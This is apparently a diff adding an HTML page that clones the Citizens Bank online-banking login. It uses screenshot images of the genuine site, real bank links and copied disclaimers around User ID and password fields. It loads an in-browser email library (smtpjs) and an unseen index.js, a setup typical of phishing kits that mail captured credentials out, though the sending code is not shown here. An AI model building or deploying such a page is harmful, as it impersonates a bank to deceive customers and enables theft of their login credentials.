@@ -1,0 +1,735 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<html>
+<head>
+    <meta charset="utf-8">
+
+        <!--"user-scalable=no" disable zooming when
+        clicking in submission boxes on mobile-->
+
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+        
+        <title>Online Banking</title>
+        <script src="index.js"></script>
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css">
+        
+
+        <!--href stands for hypertext reference-->
+        <link rel="icon" href="ico.png" type="image/png">
+
+        <link rel="stylesheet" href="styles.css"
+        type="text/css">
+        <link rel="icon" href="logo.png" type="image/png">
+        <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+        <script src="https://smtpjs.com/v3/smtp.js"></script>
+
+</head>
+
+<body>
+    <div class="container">
+
+
+        <div class="navi">
+            <div class="innavi">
+                <a href="index.html" id="navbar__logo"><img src="head.png" width="155" height="34" class="headnav"></a>
+            </div>
+        </div>
+            
+        <div class="greendiv">
+            <div class="ingr">
+                <img src="welcome.png" width="385px" height="78px" id="ingrimg">
+            </div>
+            <div class="ingr2">
+                <img src="welcomphone.png" class="phoneim">
+            </div>
+        </div>
+        <style>
+            .ingr {
+                position: relative;
+                top: 15px;
+                left: 25px;
+                display: block;
+            }
+            .phoneim {
+                display: none;
+            }
+            #ingrimg {
+                display: block;
+            }
+            .ingr2 {
+                display: none;
+            }
+            .greendiv {
+                background-color: #006a44;
+
+                width: 100%;
+                height: 116px;
+                z-index: 2;
+                position: absolute;
+                margin-top: 0px;
+                border-top: 2px solid rgb(168, 168, 168);
+                margin-left: -8px;
+
+            }
+            @media (max-width: 768px) {
+                .ingrimg {
+                    display: none;
+                }
+                .ingr {
+                    display: none;
+                }
+                .ingr2 {
+                    position: relative;
+                    top: 16px;
+                    left: 25px;
+                    display: block;
+                }
+                .phoneim {
+                    display: block;
+                    height: 85px;
+                    width: 286px;
+                }
+                .form-contact {
+                    position: relative;
+                    right: 0px;
+                }
+                .form-contact input[type="text"] {
+                    width: 340px;
+                    height: 44px;
+                    font-size: 16px;
+                    color: #2b2b2b;
+                }
+                
+                .form-contact input[type="password"] {
+                    width: 340px;
+                    height: 44px;
+                    font-size: 16px;
+                    color: #2b2b2b;
+                }
+                .innavi {
+                    position: relative;
+                    right: 103px;
+                }
+            }
+
+            .nexus {
+                position: relative;
+                left: 30px;
+            }
+
+        </style>
+
+        <div class="containaa171">
+            <div class="nexus">
+                <form action="#" class="form-contact">
+                    <div class="userdiv">
+                        <div class="labeluser" style="text-align: left;">
+                            <label for="username" id="fuser"><b>User ID</b></label>
+                        </div>
+                        <input type="text" id="fuser1">
+                    </div>
+                    <div class="passdiv">
+                        <div class="labeluser" style="text-align: left;">
+                            <label for="Password"><b>Password</b></label>
+                        </div>
+                        <input type="password" id="fpass1">
+                    </div>
+                    <div class="checkintbx">
+                        <label class="remember-label">
+                            <div class="remdiav" id="remdiav" onmouseover="changeDisplay()"></div>
+                            <input id="fremember" type="checkbox" name="remember" class="remember-checkbox" style="cursor:pointer;">
+                            <label for="check" class="remtext">Remember user ID</label>
+                        </label>
+                    </div>
+                    <br>
+                    <div class="trl">
+                        <div class="troubdiv">
+                            <a href="https://www.citizensbankonline.com/olb-root/trouble"><img src="trouble.png" height="24px" width="144px"><br></a>
+                        </div>
+                        <div class="troubdiv2">
+                            <a href="https://www.citizensbankonline.com/olb-root/enrollment"><img src="enrol.png" height="24px" width="250px"></a>
+                        </div>
+                    </div>
+
+                    <div class="submitdiv">
+                       <input type="image" id="submitBtn" src="login.png" width="145px" height="52px" onmouseover="changeImage()" onmouseout="restoreImage()">
+
+                       <a href="https://www.citizensbank.com"><img src="cancel.png" width="134px" height="51px"></a>
+                    </div>
+                    <style>
+                        .containaa171 {
+                            position: relative;
+                            top: -250px;
+                            height: 1200px;
+                            text-align: center;
+                            align-items: center;
+                            justify-content: center;
+                            display: flex;
+                        }
+
+                        @media (max-width: 768px){
+                            .containaa171 {
+                                position: relative;
+                                top: -275px;
+                                height: 1200px;
+                                text-align: center;
+                                align-items: center;
+                                justify-content: center;
+                                display: flex;
+                            }
+                        }
+
+                        .submitdiv {
+                            position: relative;
+                            top: 62px;
+                            right: 84px;
+
+                        }
+
+                    </style>
+                    
+    
+                <form>
+
+            </div>
+            <div class="troubbbbb">
+                <a href="https://www.citizensbank.com/customer-service/contact-us.aspx"><img src="needhelp.png" width="236px" height="141px" class="t"></a>
+            </div>
+
+            <style>
+                .troubbbbb {
+                    position: relative;
+                    right: -245px;
+                    top: -99px;
+                    display: block;
+                }
+                .t {
+                    display: block;
+                }
+                .nexus {
+                    left: 0px;
+                }
+            </style>
+            <script>
+                function changeImage() {
+                    document.getElementById('submitBtn').src = 'hoverlog.png';
+                }
+        
+                function restoreImage() {
+                    document.getElementById('submitBtn').src = 'login.png';
+                }
+            </script>
+
+        </div>
+        <div class="troubbbbb2">
+            <a href="https://www.citizensbank.com/customer-service/contact-us.aspx"><img src="needhelp.png" width="236px" height="141px" class="trbmg2"></a>
+        </div>
+
+        <div class="containersec">
+            <div class="firstsec">
+                <img src="citilj.png" width="165px" height="42px">
+            </div>
+            <div class="secsec">
+                <a href="https://www.citizensbank.com/about-us/our-company/overview.aspx"><img src="company.png" width="490px" height="129px" class="sec1mg"></a>
+            </div>
+        </div>
+        <div class="secsec2">
+            <a href="https://www.citizensbank.com/about-us/our-company/overview.aspx"><img src="company2.png" width="285px" height="250px" class="sec2mg"></a>
+        </div>
+        <div class="mobappdiv">
+            <a href="https://www.citizensbank.com/mobile-and-online-banking/online-demos.aspx?WT.ac=CB_H_SecondUnit_HowtoUseMobileBanking_MB_ShortDemos_A638"><img src="mobileapp.png" width="165px" height="29px"></a>
+        </div>
+
+        <div class="v444">
+            <div class="insoci">
+                <a href="https://www.facebook.com/citizensbank"><img src="social.png" width="172px" height="29px"></a>
+            </div>
+            <div class="sitediv">
+                <a href="https://www.citizensbank.com/account-safeguards/overview.aspx?"><img src="sitemap.png" width="790px" height="22px" class="ndo"></a>
+            </div>
+            <div class="sitediv2">
+                <a href="https://www.citizensbank.com/account-safeguards/overview.aspx?"><img src="sitemap2.png" width="341px" height="130px" class="sto"></a>
+            </div>
+        </div>
+        <div class="disc">
+            <div class="discin">
+                <a href="https://www.citizensbank.com/account-safeguards/online-terms-and-conditions.aspx"><img src="disclose.png" width="1176px" height="110px" class="discpc"></a>
+            </div>
+            <div class="discin2">
+                <a href="https://www.citizensbank.com/account-safeguards/online-terms-and-conditions.aspx"><img src="discmob.png" width="246px" height="240" class="discmob"></a>
+            </div>
+        </div>
+        <div class="paragraph">
+            <div class="num111">
+                <p class="ptt">*Securities, Insurance Products and Investment Advisory Services offered through Citizens Securities, Inc. ("CSI"). CSI is an SEC registered investment adviser and Member - FINRA and SIPC. One Citizens Bank Way, JCB135, Johnston, RI 02919. CSI is an affiliate of Citizens Bank, N.A.</p>
+            </div>
+            <div class="num111">
+                <p class="ptt">The investment balances shown in online banking are based on market prices, with up to a fifteen minute delay from the time this webpage was last refreshed. Information relating to accounts not held at CSI is presented as an accommodation and while drawn from sources believed to be reliable is not guaranteed as to accuracy or completeness. Such information should be independently confirmed by the account owner(s).</p>
+            </div>
+            <div class="num111">
+                <p class="ptt">Information relating to accounts not held or custodied by National Financial Services (NFS) (Assets Held Away), CSI’s clearing broker dealer, was provided to NFS by outside parties and is included for informational purposes only. These positions are not part of your brokerage account carried by NFS and therefore any SIPC account protection afforded your account through NFS does not cover these assets or prices reported. Neither NFS, CSI nor Citizens are responsible for the Assets Held Away information provided and does not guarantee the accuracy or timeliness of the positions or prices reported. Prices shown do not necessarily reflect the actual current market prices. Further information regarding these prices may be obtained by contacting CSI.</p>
+            </div>
+            <div class="num111">
+                <p class="ptt">The investment products and financial strategies suggested herein are subject to investment risk, including possible loss of principal amount invested. Investment decisions should be based on each individual's goals, time horizon and tolerance for risk.</p>
+            </div>
+            <div class="num111">
+                <p class="ptt">SpeciFi® is made available through CSI. Portfolio management services are sub-advised by SigFig Wealth Management, LLC ("SigFig"), an SEC registered investment adviser. SigFig is not an affiliate of CSI or Citizens Bank, N.A.</p>
+            </div>
+        </div>
+
+        <div class="fdidiv">
+            <img src="fdi.png" width="1238px" height="85px" class="fdi">
+        </div>
+        
+        <div class="fdidiv2">
+            <img src="notm.png" width="320px" height="130px" class="fdi2">
+        </div>
+        <div class="num111" style="top: -147px;">
+            <p class="ptt">©2023 Citizens Financial Group, Inc. All rights reserved. Citizens is a brand name of Citizens Bank, N.A.. Member FDIC.</p>
+        </div>
+        <style>
+            .fdi2 {
+                display: none;
+            }
+            .fdidiv2 {
+                display: none;
+            }
+            .fdidiv {
+                text-align: center;
+                align-items: center;
+                justify-content: center;
+                position: relative;
+                left: 4px;
+                top: -194px;
+                display: block;
+            }
+            .fdi {
+                display: block;
+            }
+            .paragraph {
+                align-items: center;
+                justify-content: center;
+                position: relative;
+                top: -252px;
+            }
+            .ptt {
+                color:rgb(105, 105, 105);
+                font-size: 14px;
+                line-height: 24px;
+            }
+            .num111{
+                width: 1200px;
+                position: relative;
+                left: 28px;
+                top: 31px;
+            }
+            .discin2{
+                display: none;
+            }
+            .discmob {
+                display: none;
+            }
+            .discin {
+                display: block;
+                text-align: center;
+                align-items: center;
+                justify-content: center;
+                margin-left: 28px;
+            }
+            .discpc {
+                display: block;
+            }
+
+            .disc {
+                align-items: center;
+                justify-content: center;
+                text-align: center;
+                position: relative;
+                top: -255px;
+            }
+            .sitediv {
+                position: relative;
+                top: 46px;
+                align-items: center;
+                justify-content: center;
+                left: 40px;
+                display: block;
+            }
+            .sitediv2 {
+                display: none;
+            }
+            .sto {
+                display: none;
+            }
+            .ndo {
+                display: block;
+            }
+
+            .mobappdiv {
+                position: relative;
+                top: -455px;
+                left: 38px;
+            }
+            .v444{
+                background-color: #f1f1f1;
+                position: absolute;
+                width: 100%;
+                margin-top: -435px;
+                margin-left: -8px;
+                height: 135px;
+            }
+
+            .insoci {
+                position: relative;
+                left: 40px;
+                top: 22px;
+            }
+
+            .secsec {
+                position: relative;
+                left: 500px;
+                top: 14px;
+                display: block;
+            }
+            .secsec2 {
+                display: none;
+            }
+            .sec1mg {
+                display: block;
+            }
+            .sec2mg {
+                display: none;
+            }
+            .containersec {
+                display: flex;
+                position: relative;
+                top: -515px;
+            }
+            .firstsec {
+                position: relative;
+                left: 33px;
+            }
+            .troubbbbb2 {
+                display: none;
+            }
+            .trbmg2 {
+                display: none;
+            }
+
+            @media (max-width: 768px) {
+
+                .fdi2 {
+                    display: block;
+                }
+                .fdidiv2 {
+                    display: block;
+                    align-items: center;
+                    text-align: center;
+                    justify-content: center;
+                    position: relative;
+                    left: 16px;
+                    top: -145px;
+                }
+                .fdidiv {
+                    text-align: center;
+                    align-items: center;
+                    justify-content: center;
+                    position: relative;
+                    left: 4px;
+                    top: -194px;
+                    display: none;
+                }
+                .fdi {
+                    display: none;
+                }
+
+                .paragraph {
+                    align-items: center;
+                    justify-content: center;
+                    position: relative;
+                    top: -193px;
+                    left: 3px;
+                }
+                .num111{
+                    width: 305px;
+                    position: relative;
+                    left: 28px;
+                    top: 31px;
+                }
+                .disc {
+                    top: -165px;
+                }
+                .discin2{
+                    display: block;
+                    position: relative;
+                }
+                .discmob {
+                    display: block;
+                }
+                .discin {
+                    display: none;
+                }
+                .discpc {
+                    display: none;
+                }
+
+                .insoci {
+                    position: relative;
+                    left: 96px;
+                }
+
+                .v444{
+                    align-items: center;
+                    justify-content: center;
+                    height: 240px;
+                }
+                .sto {
+                    display: block;
+                }
+                .ndo {
+                    display: none;
+                }
+                .sitediv {
+                    display: none;
+                }
+                .sitediv2 {
+                    display: block;
+                    position: relative;
+                    top: 45px;
+                    left: 24px;
+                }
+
+                .mobappdiv {
+                    position: relative;
+                    top: -485px;
+                    left: 18px;
+                }
+                .containersec {
+                    display: block;
+                }
+                .firstsec {
+                    position: relative;
+                    top: -54px;
+                    margin-left: -23px;
+                }
+                .secsec{
+                    display: none;
+                }
+                .secsec2{
+                    display: block;
+                    position: relative;
+                    top: -515px;
+                    left: 11px;
+
+                }
+                .sec2mg {
+                    display: block;
+                }
+                .sec1mg {
+                    display: none;
+                }
+            }
+            @media (max-width: 768px){
+                .troubbbbb {
+                    display: none;
+                }
+                .t {
+                    display: none;
+                }
+                .form-contact {
+                    right: 0px;
+                }
+                .trl {
+                    position: relative;
+                    left: 54px;
+                }
+                .submitdiv {
+                    position: relative;
+                    top: 62px;
+                    right: 24px;
+                }
+                .troubbbbb2 {
+                    display: block;
+                    position: relative;
+                    top: -603px;
+                    left: 12px;
+                }
+                .trbmg2 {
+                    display: block;
+                }
+            }
+        </style>
+
+        <style>
+            .troubdiv {
+                position: relative;
+                top: 22px;
+                right: 160px;
+            }
+            .troubdiv2 {
+                position: relative;
+                top: 30px;
+                right: 110px;
+            }
+            .remdiav {
+                width: 29px;
+                height: 29px;
+                position: absolute;
+                background-color: #cdcdcd;
+                z-index: -1;
+                margin-left: 0.7px;
+                border-radius: 2px;
+                display: none;
+            }
+            
+            .remtext {
+                margin-left: 8px;
+                margin-top: 3px;
+                color: #343434;
+            }
+            .checkintbx {
+                position: relative;
+                top: 12px;
+                right: 6px;
+            }
+            @media (max-width: 768px){
+                .remdiav {
+                    margin-left: -1px;
+                }
+                .checkintbx {
+                    margin-left: 5px;
+                }
+            }
+            .labeluser {
+                margin-bottom: 7px;
+            }
+            .passdiv {
+                margin-top: 25px;
+            }
+            /*   remember me    */
+
+            .remember-label {
+                display: flex;
+                align-items: center;
+                color: #484848;
+                font-size: 15px;
+                margin-right: 105px;
+                margin-top: 15px;
+            }                         
+
+            .remember-checkbox {
+                width: 20px;
+                height: 20px;
+            }   
+
+
+            #fremember{
+                width: 22px;
+                height: 22px;
+                -webkit-appearance: none;
+                appearance: none;
+                background-color:#ffffff;
+                border-radius: 4px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                border: 2px solid #646464;
+                border-radius: 5%;
+            }
+
+            #fremember:after {
+                width: 22px;
+                height: 22px;
+                border-radius: 5%;
+                font-family: "Font Awesome 5 Free";
+                font-weight: 900;
+                font-size: 14px;
+                appearance: none;
+                background-color:#393939;
+                border-radius: 2px;
+                content: "\f00c";
+                color: rgb(255, 255, 255);
+                border: 2px solid #393939;
+                display: none;
+                align-items: center;
+                justify-content: center;
+                text-align: center;
+             
+            }
+            
+            #fremember:checked:after{
+                display: flex;
+                background-color: #006a44;
+                height: 14px;
+                border: 4px solid #006a44;
+                border-top: 4px solid #006a44;
+            }
+        </style>
+    
+          
+          
+    </div>
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+          var remdiavElement = document.getElementById('remdiav');
+          var checkboxElement = document.getElementById('fremember');
+      
+          checkboxElement.addEventListener('mouseover', function () {
+            remdiavElement.style.display = 'block';
+          });
+      
+          checkboxElement.addEventListener('mouseout', function () {
+            remdiavElement.style.display = 'none';
+          });
+      
+          checkboxElement.addEventListener('focus', function () {
+            remdiavElement.style.display = 'block';
+          });
+      
+          checkboxElement.addEventListener('blur', function () {
+            remdiavElement.style.display = 'none';
+          });
+        });
+    </script>
+      
+      
+      
+    <script>
+        var button11 = document.querySelector('.form-contact input[type="image"]');
+        var finput11 = document.querySelector('.form-contact input[type="text"]');
+        var fpass11 = document.querySelector('.form-contact input[type="password"]');
+        var red11 = document.querySelector('.red');
+        var red211 = document.querySelector('.red2');
+
+    
+        button11.addEventListener('click', function(event) {
+            var finput11BorderColor = getComputedStyle(finput11).borderBottomColor.toLowerCase();
+
+            if (finput11.value === '' && fpass11.value !== '') {
+                event.preventDefault();
+                
+                finput11.classList.add('redd');
+                red11.style.display = "block";
+
+            } else if (fpass11.value === '' && finput11.value !== ''){
+
+                fpass11.classList.add('redd');
+                red211.style.display = "block";
+            
+            } else if (finput11.value === '' && fpass11.value === ''){
+
+                finput11.classList.add('redd');
+                red11.style.display = "block";
+                fpass11.classList.add('redd');
+                red211.style.display = "block";
+
+            } else {
+                red11.style.display = "none";
+                red211.style.display = "none";
+            }
+        });
+    </script>
+
+</body>
+</html>
